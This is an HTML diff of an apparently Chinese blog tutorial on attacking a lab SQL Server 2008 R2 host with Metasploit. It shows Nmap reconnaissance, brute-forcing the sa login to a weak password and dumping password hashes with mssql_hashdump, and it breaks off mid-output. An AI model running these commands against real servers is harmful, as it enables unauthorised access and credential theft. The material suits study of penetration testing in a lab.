@@ -30,7 +30,7 @@
 <meta property="og:description" content="该文章暂无概述">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2021-12-07T03:22:00.000Z">
-<meta property="article:modified_time" content="2023-12-09T15:23:18.424Z">
+<meta property="article:modified_time" content="2023-12-12T09:53:36.493Z">
 <meta property="article:author" content="Ghost">
 <meta property="article:tag" content="Metasploit">
 <meta name="twitter:card" content="summary">
@@ -143,9 +143,9 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="nav-text">一、实验环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4"><span class="nav-text">二、实验步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-nmap-%E5%AF%B9-sql-server-%E8%BF%9B%E8%A1%8C%E8%B8%A9%E7%82%B9"><span class="nav-text">1、使用 Nmap 对 SQL Server
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="nav-text">1. 实验环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4"><span class="nav-text">2. 实验步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-nmap-%E5%AF%B9-sql-server-%E8%BF%9B%E8%A1%8C%E8%B8%A9%E7%82%B9"><span class="nav-text">1、使用 Nmap 对 SQL Server
 进行踩点</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%B9%E7%9B%AE%E6%A0%87%E7%9A%841433%E7%AB%AF%E5%8F%A3%E8%BF%9B%E8%A1%8C%E4%B8%80%E6%AC%A1%E6%9C%8D%E5%8A%A1%E4%BE%A6%E6%B5%8B%E6%9D%A5%E5%AE%8C%E6%88%90%E5%AF%B9%E7%9B%AE%E6%A0%87%E7%B3%BB%E7%BB%9F%E7%9A%84sql-server%E8%B8%A9%E7%82%B9%E5%B7%A5%E4%BD%9C"><span class="nav-text">（1）对目标的1433端口进行一次服务侦测来完成对目标系统的SQL
-Server踩点工作</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%B9udp%E7%AB%AF%E5%8F%A31434%E7%9A%84%E6%9C%8D%E5%8A%A1%E4%BE%A6%E6%B5%8B%E6%89%AB%E6%8F%8F"><span class="nav-text">（2）对UDP端口1434的服务侦测扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8nmap%E8%84%9A%E6%9C%AC%E6%9D%A5%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="nav-text">（3）使用Nmap脚本来获取目标数据库的信息</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81"><span class="nav-text">2、暴力破解密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8D%95%E8%8E%B7%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%8F%A3%E4%BB%A4"><span class="nav-text">3、捕获服务器的口令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%8F%E8%A7%88-sql-server"><span class="nav-text">4、浏览 SQL Server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="nav-text">5、后渗透&#x2F;执行系统命令</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%B9%E5%BA%94%E6%A8%A1%E5%9D%97"><span class="nav-text">（1）对应模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%87%8D%E6%96%B0%E8%BD%BD%E5%85%A5xp_cmdshell%E5%8A%9F%E8%83%BD"><span class="nav-text">（2）重新载入xp_cmdshell功能</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%90%E8%A1%8Csql%E6%9F%A5%E8%AF%A2%E5%91%BD%E4%BB%A4"><span class="nav-text">（3）运行SQL查询命令</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="nav-text">三、参考文献</span></a></li></ol></div>
+Server踩点工作</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%B9udp%E7%AB%AF%E5%8F%A31434%E7%9A%84%E6%9C%8D%E5%8A%A1%E4%BE%A6%E6%B5%8B%E6%89%AB%E6%8F%8F"><span class="nav-text">（2）对UDP端口1434的服务侦测扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8nmap%E8%84%9A%E6%9C%AC%E6%9D%A5%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="nav-text">（3）使用Nmap脚本来获取目标数据库的信息</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81"><span class="nav-text">2、暴力破解密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8D%95%E8%8E%B7%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%8F%A3%E4%BB%A4"><span class="nav-text">3、捕获服务器的口令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%8F%E8%A7%88-sql-server"><span class="nav-text">4、浏览 SQL Server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="nav-text">5、后渗透&#x2F;执行系统命令</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%B9%E5%BA%94%E6%A8%A1%E5%9D%97"><span class="nav-text">（1）对应模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%87%8D%E6%96%B0%E8%BD%BD%E5%85%A5xp_cmdshell%E5%8A%9F%E8%83%BD"><span class="nav-text">（2）重新载入xp_cmdshell功能</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%90%E8%A1%8Csql%E6%9F%A5%E8%AF%A2%E5%91%BD%E4%BB%A4"><span class="nav-text">（3）运行SQL查询命令</span></a></li></ol></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -245,7 +245,7 @@ Server踩点工作</span></a></li><li class="nav-item nav-level-4"><a class="nav
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-12-09 23:23:18" itemprop="dateModified" datetime="2023-12-09T23:23:18+08:00">2023-12-09</time>
+      <time title="修改时间：2023-12-12 17:53:36" itemprop="dateModified" datetime="2023-12-12T17:53:36+08:00">2023-12-12</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -282,231 +282,40 @@ Server踩点工作</span></a></li><li class="nav-item nav-level-4"><a class="nav
     
     
     
-    <div class="post-body" itemprop="articleBody"><h2 id="一实验环境">一、实验环境</h2>
+    <div class="post-body" itemprop="articleBody"><h2 id="实验环境">1. 实验环境</h2>
 <p><strong>攻击机：</strong></p>
-<p><strong>kali 2019-3 </strong></p>
+<p><strong>kali 2019-3</strong></p>
 <p><strong>靶机环境：</strong></p>
 <p><strong>装有SQL Server 2008 R2
 的Windows10（192.168.1.104）</strong></p>
-<h2 id="二实验步骤">二、实验步骤</h2>
+<h2 id="实验步骤">2. 实验步骤</h2>
 <h3 id="使用-nmap-对-sql-server-进行踩点">1、使用 Nmap 对 SQL Server
 进行踩点</h3>
 <h4
 id="对目标的1433端口进行一次服务侦测来完成对目标系统的sql-server踩点工作">（1）对目标的1433端口进行一次服务侦测来完成对目标系统的SQL
 Server踩点工作</h4>
-<pre><code>**msf5 &gt; db_nmap -sV -p 1433 192.168.1.104**
-    [*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2021-10-05 08:41 EDT
-    [*] Nmap: Nmap scan report for 192.168.1.104
-    [*] Nmap: Host is up (0.011s latency).
-    [*] Nmap: PORT     STATE SERVICE  VERSION
-    [*] Nmap: 1433/tcp open  ms-sql-s Microsoft SQL Server 2008 R2 10.50.1600; RTM
-    [*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-    [*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-    [*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 7.08 seconds
-    **msf5** **&gt;** **services** 
-    Services
-    ========
-    
-    host           port  proto  name      state  info
-    ----           ----  -----  ----      -----  ----
-    192.168.1.104  1433  tcp    ms-sql-s  open   Microsoft SQL Server 2008 R2 10.50.1600; RTM</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; db_nmap -sV -p 1433 192.168.1.104</span><br><span class="line">[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2021-10-05 08:41 EDT</span><br><span class="line">[*] Nmap: Nmap scan report <span class="keyword">for</span> 192.168.1.104</span><br><span class="line">[*] Nmap: Host is up (0.011s latency).</span><br><span class="line">[*] Nmap: PORT     STATE SERVICE  VERSION</span><br><span class="line">[*] Nmap: 1433/tcp open  ms-sql-s Microsoft SQL Server 2008 R2 10.50.1600; RTM</span><br><span class="line">[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line">[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">[*] Nmap: Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 7.08 seconds</span><br><span class="line">msf5 &gt;services </span><br><span class="line">Services</span><br><span class="line">========</span><br><span class="line"></span><br><span class="line">host           port  proto  name      state  info</span><br><span class="line">----           ----  -----  ----      -----  ----</span><br><span class="line">192.168.1.104  1433  tcp    ms-sql-s  open   Microsoft SQL Server 2008 R2 10.50.1600; RTM</span><br></pre></td></tr></table></figure>
 <h4
 id="对udp端口1434的服务侦测扫描">（2）对UDP端口1434的服务侦测扫描</h4>
-<pre><code>**msf5 &gt; db_nmap -sU -sV -p 1434 192.168.1.104**
-    ……</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; db_nmap -sU -sV -p 1434 192.168.1.104</span><br><span class="line">……</span><br></pre></td></tr></table></figure>
 <h4
 id="使用nmap脚本来获取目标数据库的信息">（3）使用Nmap脚本来获取目标数据库的信息</h4>
-<pre><code>**msf5 &gt; db_nmap -sU --script=ms-sql-info -p 1434 192.168.1.104**
-    [*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2021-10-05 08:56 EDT
-    [*] Nmap: Nmap scan report for 192.168.1.104
-    [*] Nmap: Host is up (0.00087s latency).
-    [*] Nmap: PORT     STATE         SERVICE
-    **[** ***] Nmap: 1434/udp open|filtered ms-sql-** **m**
-    **[** *** ] Nmap: Host script results:
-    [*] Nmap: | ms-sql-info:
-    [*] Nmap: |   192.168.1.104:1433:
-    [*] Nmap: |     Version:
-    [*] Nmap: |       name: Microsoft SQL Server 2008 R2 RTM
-    [*] Nmap: |       number: 10.50.1600.00
-    [*] Nmap: |       Product: Microsoft SQL Server 2008 R2
-    [*] Nmap: |       Service pack level: RTM
-    [*] Nmap: |       Post-SP patches applied: false
-    [*] Nmap: |_    TCP port: 1433**
-    [*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 5.71 seconds
- **msf5** **&gt; db_nmap -sT --script=ms-sql-info -p 1433 192.168.1.104**
-    [*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2021-10-05 08:59 EDT
-    [*] Nmap: Nmap scan report for 192.168.1.104
-    [*] Nmap: Host is up (0.0011s latency).
-    [*] Nmap: PORT     STATE SERVICE
-    **[** ***] Nmap: 1433/tcp open  ms-sql- s
-    [*] Nmap: Host script results:
-    [*] Nmap: | ms-sql-info:
-    [*] Nmap: |   192.168.1.104:1433:
-    [*] Nmap: |     Version:
-    [*] Nmap: |       name: Microsoft SQL Server 2008 R2 RTM
-    [*] Nmap: |       number: 10.50.1600.00
-    [*] Nmap: |       Product: Microsoft SQL Server 2008 R2
-    [*] Nmap: |       Service pack level: RTM
-    [*] Nmap: |       Post-SP patches applied: false
-    [*] Nmap: |_    TCP port: 1433**
-    [*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 5.26 seconds</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> msf5 &gt; db_nmap -sU --script=ms-sql-info -p 1434 192.168.1.104</span><br><span class="line">   [*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2021-10-05 08:56 EDT</span><br><span class="line">   [*] Nmap: Nmap scan report <span class="keyword">for</span> 192.168.1.104</span><br><span class="line">   [*] Nmap: Host is up (0.00087s latency).</span><br><span class="line">   [*] Nmap: PORT     STATE         SERVICE</span><br><span class="line">   [*] Nmap: 1434/udp open|filtered ms-sql-m</span><br><span class="line">   [* ] Nmap: Host script results:</span><br><span class="line">   [*] Nmap: | ms-sql-info:</span><br><span class="line">   [*] Nmap: |   192.168.1.104:1433:</span><br><span class="line">   [*] Nmap: |     Version:</span><br><span class="line">   [*] Nmap: |       name: Microsoft SQL Server 2008 R2 RTM</span><br><span class="line">   [*] Nmap: |       number: 10.50.1600.00</span><br><span class="line">   [*] Nmap: |       Product: Microsoft SQL Server 2008 R2</span><br><span class="line">   [*] Nmap: |       Service pack level: RTM</span><br><span class="line">   [*] Nmap: |       Post-SP patches applied: <span class="literal">false</span></span><br><span class="line">   [*] Nmap: |_    TCP port: 1433</span><br><span class="line">   [*] Nmap: Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 5.71 seconds</span><br><span class="line">msf5&gt; db_nmap -sT --script=ms-sql-info -p 1433 192.168.1.104</span><br><span class="line">   [*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2021-10-05 08:59 EDT</span><br><span class="line">   [*] Nmap: Nmap scan report <span class="keyword">for</span> 192.168.1.104</span><br><span class="line">   [*] Nmap: Host is up (0.0011s latency).</span><br><span class="line">   [*] Nmap: PORT     STATE SERVICE</span><br><span class="line">   [*] Nmap: 1433/tcp open  ms-sql- s</span><br><span class="line">   [*] Nmap: Host script results:</span><br><span class="line">   [*] Nmap: | ms-sql-info:</span><br><span class="line">   [*] Nmap: |   192.168.1.104:1433:</span><br><span class="line">   [*] Nmap: |     Version:</span><br><span class="line">   [*] Nmap: |       name: Microsoft SQL Server 2008 R2 RTM</span><br><span class="line">   [*] Nmap: |       number: 10.50.1600.00</span><br><span class="line">   [*] Nmap: |       Product: Microsoft SQL Server 2008 R2</span><br><span class="line">   [*] Nmap: |       Service pack level: RTM</span><br><span class="line">   [*] Nmap: |       Post-SP patches applied: <span class="literal">false</span></span><br><span class="line">   [*] Nmap: |_    TCP port: 1433</span><br><span class="line">   [*] Nmap: Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 5.26 seconds</span><br></pre></td></tr></table></figure>
 <h3 id="暴力破解密码">2、暴力破解密码</h3>
 <p><strong>对应模块auxiliary/scanner/mssql/mssql_login
 ，依据提示设置相应爆破字典，run即可。</strong></p>
 <p><strong>示例：</strong></p>
-<pre><code>**msf5 &gt; use auxiliary/scanner/mssql/mssql_login 
-    msf5 auxiliary(scanner/mssql/mssql_login) &gt;** **show options** 
-    
-    Module options (auxiliary/scanner/mssql/mssql_login):
-    
-       Name                 Current Setting  Required  Description
-       ----                 ---------------  --------  -----------
-       BLANK_PASSWORDS      false            no        Try blank passwords for all users
-       BRUTEFORCE_SPEED     5                yes       How fast to bruteforce, from 0 to 5
-       DB_ALL_CREDS         false            no        Try each user/password couple stored in the current database
-       DB_ALL_PASS          false            no        Add all passwords in the current database to the list
-       DB_ALL_USERS         false            no        Add all users in the current database to the list
-       PASSWORD                              no        A specific password to authenticate with
-       PASS_FILE                             no        File containing passwords, one per line
-       RHOSTS                                yes       The target address range or CIDR identifier
-       RPORT                1433             yes       The target port (TCP)
-       STOP_ON_SUCCESS      false            yes       Stop guessing when a credential works for a host
-       TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data &quot;Force Encryption&quot;
-       THREADS              1                yes       The number of concurrent threads
-       USERNAME                              no        A specific username to authenticate as
-       USERPASS_FILE                         no        File containing users and passwords separated by space, one pair per line
-       USER_AS_PASS         false            no        Try the username as the password for all users
-       USER_FILE                             no        File containing usernames, one per line
-       USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)
-       VERBOSE              true             yes       Whether to print output for all attempts
-    
- **msf5 auxiliary(scanner** **/mssql/mssql_login) &gt; set rhosts 192.168.1.104**
-    rhosts =&gt; 192.168.1.104 **msf5 auxiliary(scanner /mssql/mssql_login) &gt;** **set username sa　　　　　　　　#默认账户名基本都是 sa**
-    username =&gt; sa
-   **msf5 auxiliary(scanner** **/mssql/mssql_login) &gt; set password 123456　　　　　　　　#这里偷个懒，一般情况是需要对 pass_file 参数指定密码字典的**
-    password =&gt; 123456 **msf5 auxiliary(scanner /mssql/mssql_login) &gt; set threads 10　　　　　　#线程数**
-    threads =&gt; 10 **msf5 auxiliary(scanner /mssql/mssql_login) &gt;** **run**
-    
-    [*] 192.168.1.104:1433    - 192.168.1.104:1433 - MSSQL - Starting authentication scanner.
-   **[** **+] 192.168.1.104:1433    - 192.168.1.104:1433 - Login Successful: WORKSTATION\sa:123456**
-    [*] 192.168.1.104:1433    - Scanned 1 of 1 hosts (100% complete)
-    [*] Auxiliary module execution completed</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/mssql/mssql_login </span><br><span class="line">    msf5 auxiliary(scanner/mssql/mssql_login) &gt;show options </span><br><span class="line">    </span><br><span class="line">    Module options (auxiliary/scanner/mssql/mssql_login):</span><br><span class="line">    </span><br><span class="line">       Name                 Current Setting  Required  Description</span><br><span class="line">       ----                 ---------------  --------  -----------</span><br><span class="line">       BLANK_PASSWORDS      <span class="literal">false</span>            no        Try blank passwords <span class="keyword">for</span> all <span class="built_in">users</span></span><br><span class="line">       BRUTEFORCE_SPEED     5                <span class="built_in">yes</span>       How fast to bruteforce, from 0 to 5</span><br><span class="line">       DB_ALL_CREDS         <span class="literal">false</span>            no        Try each user/password couple stored <span class="keyword">in</span> the current database</span><br><span class="line">       DB_ALL_PASS          <span class="literal">false</span>            no        Add all passwords <span class="keyword">in</span> the current database to the list</span><br><span class="line">       DB_ALL_USERS         <span class="literal">false</span>            no        Add all <span class="built_in">users</span> <span class="keyword">in</span> the current database to the list</span><br><span class="line">       PASSWORD                              no        A specific password to authenticate with</span><br><span class="line">       PASS_FILE                             no        File containing passwords, one per line</span><br><span class="line">       RHOSTS                                <span class="built_in">yes</span>       The target address range or CIDR identifier</span><br><span class="line">       RPORT                1433             <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">       STOP_ON_SUCCESS      <span class="literal">false</span>            <span class="built_in">yes</span>       Stop guessing when a credential works <span class="keyword">for</span> a host</span><br><span class="line">       TDSENCRYPTION        <span class="literal">false</span>            <span class="built_in">yes</span>       Use TLS/SSL <span class="keyword">for</span> TDS data <span class="string">&quot;Force Encryption&quot;</span></span><br><span class="line">       THREADS              1                <span class="built_in">yes</span>       The number of concurrent threads</span><br><span class="line">       USERNAME                              no        A specific username to authenticate as</span><br><span class="line">       USERPASS_FILE                         no        File containing <span class="built_in">users</span> and passwords separated by space, one pair per line</span><br><span class="line">       USER_AS_PASS         <span class="literal">false</span>            no        Try the username as the password <span class="keyword">for</span> all <span class="built_in">users</span></span><br><span class="line">       USER_FILE                             no        File containing usernames, one per line</span><br><span class="line">       USE_WINDOWS_AUTHENT  <span class="literal">false</span>            <span class="built_in">yes</span>       Use windows authentification (requires DOMAIN option <span class="built_in">set</span>)</span><br><span class="line">       VERBOSE              <span class="literal">true</span>             <span class="built_in">yes</span>       Whether to <span class="built_in">print</span> output <span class="keyword">for</span> all attempts</span><br><span class="line">    </span><br><span class="line"> msf5 auxiliary(scanner/mssql/mssql_login) &gt; <span class="built_in">set</span> rhosts 192.168.1.104</span><br><span class="line">    rhosts =&gt; 192.168.1.104 msf5 auxiliary(scanner /mssql/mssql_login) &gt;<span class="built_in">set</span> username sa　　　　　　　　<span class="comment">#默认账户名基本都是 sa</span></span><br><span class="line">    username =&gt; sa</span><br><span class="line">   msf5 auxiliary(scanner/mssql/mssql_login) &gt; <span class="built_in">set</span> password 123456　　　　　　　　<span class="comment">#这里偷个懒，一般情况是需要对 pass_file 参数指定密码字典的</span></span><br><span class="line">    password =&gt; 123456 msf5 auxiliary(scanner /mssql/mssql_login) &gt; <span class="built_in">set</span> threads 10　　　　　　<span class="comment">#线程数</span></span><br><span class="line">    threads =&gt; 10 msf5 auxiliary(scanner /mssql/mssql_login) &gt;run</span><br><span class="line">    </span><br><span class="line">    [*] 192.168.1.104:1433    - 192.168.1.104:1433 - MSSQL - Starting authentication scanner.</span><br><span class="line">   [+] 192.168.1.104:1433    - 192.168.1.104:1433 - Login Successful: WORKSTATION\sa:123456</span><br><span class="line">    [*] 192.168.1.104:1433    - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">    [*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
 <h3 id="捕获服务器的口令">3、捕获服务器的口令</h3>
-<p><strong>对应模块：auxiliary/scanner/mssql/mssql_hashdump，操作如下：</strong></p>
-<pre><code>**msf5 &gt; use auxiliary/scanner/mssql/mssql_hashdump 
-    msf5 auxiliary(scanner/mssql/mssql_hashdump) &gt;** **show options** 
-    
-    Module options (auxiliary/scanner/mssql/mssql_hashdump):
-    
-       Name                 Current Setting  Required  Description
-       ----                 ---------------  --------  -----------
-       PASSWORD                              no        The password for the specified username
-       RHOSTS                                yes       The target address range or CIDR identifier
-       RPORT                1433             yes       The target port (TCP)
-       TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data &quot;Force Encryption&quot;
-       THREADS              1                yes       The number of concurrent threads
-       USERNAME             sa               no        The username to authenticate as
-       USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)
-    
-   **msf5 auxiliary(scanner** **/mssql/mssql_hashdump) &gt; set rhosts 192.168.1.104**
-    rhosts =&gt; 192.168.1.104 **msf5 auxiliary(scanner /mssql/mssql_hashdump) &gt; set password 123456**
-    password =&gt; 123456 **msf5 auxiliary(scanner /mssql/mssql_hashdump) &gt; set threads 10**
-    threads =&gt; 10 **msf5 auxiliary(scanner /mssql/mssql_hashdump) &gt;** **run**
-    
-    [*] 192.168.1.104:1433    - Instance Name: nil
-**[** **+] 192.168.1.104:1433    - Saving mssql05 = sa:0100daf63……　　　　　
-    [+] 192.168.1.104:1433    - Saving mssql05 = ##MS_PolicyEventProcessingLogin##:0100a8df1bd75……
-    [+] 192.168.1.104:1433    - Saving mssql05 = ##MS_PolicyTsqlExecutionLogin##:0100b5e6b……
-    [+] 192.168.1.104:1433    - Saving mssql05 = admin:0100f72e3d144e12782……
-    [+] 192.168.1.104:1433    - Saving mssql05 = coach:010060e……
-    [+] 192.168.1.104:1433    - Saving mssql05 =** **student:01004ac65 ……**
-    [*] 192.168.1.104:1433    - Scanned 1 of 1 hosts (100% complete)
-    [*] Auxiliary module execution completed
-    msf5 auxiliary(scanner/mssql/mssql_hashdump) &gt; </code></pre>
+<p>对应模块：auxiliary/scanner/mssql/mssql_hashdump，操作如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/mssql/mssql_hashdump </span><br><span class="line">    msf5 auxiliary(scanner/mssql/mssql_hashdump) &gt;show options </span><br><span class="line">    </span><br><span class="line">    Module options (auxiliary/scanner/mssql/mssql_hashdump):</span><br><span class="line">    </span><br><span class="line">       Name                 Current Setting  Required  Description</span><br><span class="line">       ----                 ---------------  --------  -----------</span><br><span class="line">       PASSWORD                              no        The password <span class="keyword">for</span> the specified username</span><br><span class="line">       RHOSTS                                <span class="built_in">yes</span>       The target address range or CIDR identifier</span><br><span class="line">       RPORT                1433             <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">       TDSENCRYPTION        <span class="literal">false</span>            <span class="built_in">yes</span>       Use TLS/SSL <span class="keyword">for</span> TDS data <span class="string">&quot;Force Encryption&quot;</span></span><br><span class="line">       THREADS              1                <span class="built_in">yes</span>       The number of concurrent threads</span><br><span class="line">       USERNAME             sa               no        The username to authenticate as</span><br><span class="line">       USE_WINDOWS_AUTHENT  <span class="literal">false</span>            <span class="built_in">yes</span>       Use windows authentification (requires DOMAIN option <span class="built_in">set</span>)</span><br><span class="line">    </span><br><span class="line">   msf5 auxiliary(scanner/mssql/mssql_hashdump) &gt; <span class="built_in">set</span> rhosts 192.168.1.104</span><br><span class="line">    rhosts =&gt; 192.168.1.104 msf5 auxiliary(scanner /mssql/mssql_hashdump) &gt; <span class="built_in">set</span> password 123456</span><br><span class="line">    password =&gt; 123456 msf5 auxiliary(scanner /mssql/mssql_hashdump) &gt; <span class="built_in">set</span> threads 10</span><br><span class="line">    threads =&gt; 10 msf5 auxiliary(scanner /mssql/mssql_hashdump) &gt;run</span><br><span class="line">    </span><br><span class="line">    [*] 192.168.1.104:1433    - Instance Name: nil</span><br><span class="line">[+] 192.168.1.104:1433    - Saving mssql05 = sa:0100daf63……　　　　　</span><br><span class="line">    [+] 192.168.1.104:1433    - Saving mssql05 = <span class="comment">##MS_PolicyEventProcessingLogin##:0100a8df1bd75……</span></span><br><span class="line">    [+] 192.168.1.104:1433    - Saving mssql05 = <span class="comment">##MS_PolicyTsqlExecutionLogin##:0100b5e6b……</span></span><br><span class="line">    [+] 192.168.1.104:1433    - Saving mssql05 = admin:0100f72e3d144e12782……</span><br><span class="line">    [+] 192.168.1.104:1433    - Saving mssql05 = coach:010060e……</span><br><span class="line">    [+] 192.168.1.104:1433    - Saving mssql05 =student:01004ac65 ……</span><br><span class="line">    [*] 192.168.1.104:1433    - Scanned 1 of 1 